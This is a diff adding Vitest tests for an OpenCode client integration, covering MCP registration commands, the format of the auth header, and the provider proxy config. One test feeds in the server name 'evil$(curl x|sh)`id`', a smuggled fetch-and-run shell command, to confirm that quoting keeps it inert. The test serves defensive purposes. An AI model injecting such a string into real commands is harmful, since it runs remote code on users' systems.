@@ -1,8 +1,16 @@
+import {
+  EXTERNAL_AGENT_ID_HEADER,
+  OPENCODE_CLIENT_ID,
+  OPENCODE_PASSTHROUGH_PROVIDER_ROUTES,
+  openCodePassthroughBaseUrl,
+} from "@archestra/shared";
 import { describe, expect, it } from "vitest";
 import {
   type ClientStep,
   CONNECT_CLIENTS,
   type McpBuildParams,
+  type ProxyBuildParams,
+  type ProxyStep,
 } from "./clients";
 
 function getCopilotClient() {
@@ -158,5 +166,138 @@ describe("Copilot CLI connection client", () => {
     expect(client.svg).toContain("M19.245 5.364");
     expect(client.iconColor).toBe("#24292f");
     expect(client.iconOverride).toBeUndefined();
+  });
+});
+
+function getOpenCodeClient() {
+  const client = CONNECT_CLIENTS.find((c) => c.id === "opencode");
+  if (!client) throw new Error("OpenCode client is missing");
+  return client;
+}
+
+function openCodeMcpCommands(params: McpBuildParams): string[] {
+  const client = getOpenCodeClient();
+  if (client.mcp.kind !== "custom") {
+    throw new Error("OpenCode MCP support should be custom");
+  }
+  const steps =
+    typeof client.mcp.steps === "function"
+      ? client.mcp.steps(params)
+      : client.mcp.steps;
+  return steps.flatMap((step) =>
+    step.buildCommand ? [step.buildCommand(params)] : [],
+  );
+}
+
+function openCodeProxySteps(
+  overrides: Partial<ProxyBuildParams> & Pick<ProxyBuildParams, "provider">,
+): ProxyStep[] {
+  const client = getOpenCodeClient();
+  if (client.proxy.kind !== "custom") {
+    throw new Error("OpenCode proxy support should be custom");
+  }
+  const instruction = client.proxy.build({
+    providerLabel: overrides.provider,
+    url: `http://localhost:9000/v1/${overrides.provider}`,
+    tokenPlaceholder: `<your-${overrides.provider}-api-key>`,
+    proxyName: "llm_proxy",
+    appName: "Archestra",
+    ...overrides,
+  });
+  if (instruction.kind !== "steps") {
+    throw new Error("OpenCode proxy instructions should be steps");
+  }
+  return instruction.steps;
+}
+
+function jsonSnippet(steps: ProxyStep[]) {
+  const code = steps.find((step) => step.language === "json")?.code;
+  if (!code) throw new Error("expected a JSON config snippet");
+  return JSON.parse(code);
+}
+
+describe("OpenCode connection client", () => {
+  const url = "http://localhost:9000/v1/mcp/default";
+
+  it("registers the gateway for OAuth and then runs OpenCode's sign-in", () => {
+    expect(
+      openCodeMcpCommands({ url, token: null, serverName: "archestra" }),
+    ).toEqual([
+      "opencode mcp add 'archestra' --url 'http://localhost:9000/v1/mcp/default'",
+      "opencode mcp auth 'archestra'",
+      "opencode mcp list",
+    ]);
+  });
+
+  it("passes a static token as an OpenCode KEY=VALUE header and skips the OAuth sign-in", () => {
+    const commands = openCodeMcpCommands({
+      url,
+      token: "archestra_TOKEN",
+      serverName: "archestra",
+    });
+
+    // `opencode mcp add --header` splits on "=", not the "Name: value" form
+    // other CLIs take.
+    expect(commands[0]).toBe(
+      "opencode mcp add 'archestra' --url 'http://localhost:9000/v1/mcp/default' --header 'Authorization=Bearer archestra_TOKEN'",
+    );
+    expect(commands.some((c) => c.startsWith("opencode mcp auth"))).toBe(false);
+  });
+
+  it("keeps a gateway-derived server name inert in every command", () => {
+    const commands = openCodeMcpCommands({
+      url,
+      token: null,
+      serverName: "evil$(curl x|sh)`id`",
+    });
+
+    expect(commands[0]).toContain("'evil$(curl x|sh)`id`'");
+    expect(commands[1]).toBe("opencode mcp auth 'evil$(curl x|sh)`id`'");
+  });
+
+  it.each([
+    "anthropic",
+    "openai",
+    "gemini",
+    "groq",
+  ] as const)("routes only the selected credentialed provider when reviewing %s", (provider) => {
+    const config = jsonSnippet(openCodeProxySteps({ provider }));
+    const rootUrl = `http://localhost:9000/v1`;
+    const route = OPENCODE_PASSTHROUGH_PROVIDER_ROUTES.find(
+      (candidate) => candidate.provider === provider,
+    );
+    expect(route).toBeDefined();
+    if (!route) throw new Error(`Missing OpenCode route for ${provider}`);
+    expect(config.enabled_providers).toEqual([route.openCodeProviderId]);
+    expect(Object.keys(config.provider)).toEqual([route.openCodeProviderId]);
+    const entry = config.provider[route.openCodeProviderId];
+    expect(entry.options).toMatchObject({
+      baseURL: openCodePassthroughBaseUrl(rootUrl, route),
+      headers: { [EXTERNAL_AGENT_ID_HEADER]: OPENCODE_CLIENT_ID },
+    });
+    expect(entry).not.toHaveProperty("apiKey");
+    expect(entry).not.toHaveProperty("npm");
+    expect(entry).not.toHaveProperty("models");
+  });
+
+  it("keeps the supported provider list in sync with the routed catalog", () => {
+    const client = CONNECT_CLIENTS.find(({ id }) => id === "opencode");
+    if (!client || client.proxy.kind !== "custom") {
+      throw new Error("OpenCode custom proxy support is missing");
+    }
+    expect(client.proxy.supportedProviders).toEqual(
+      OPENCODE_PASSTHROUGH_PROVIDER_ROUTES.map(({ provider }) => provider),
+    );
+  });
+
+  it("brands proxy instructions with the deployment's app name", () => {
+    for (const provider of ["anthropic", "openai", "groq"] as const) {
+      const prose = openCodeProxySteps({ provider, appName: "Acme AI" })
+        .map((step) => `${step.title} ${step.body ?? ""}`)
+        .join("\n");
+
+      expect(prose).toContain("Acme AI");
+      expect(prose).not.toContain("Archestra");
+    }
   });
 });
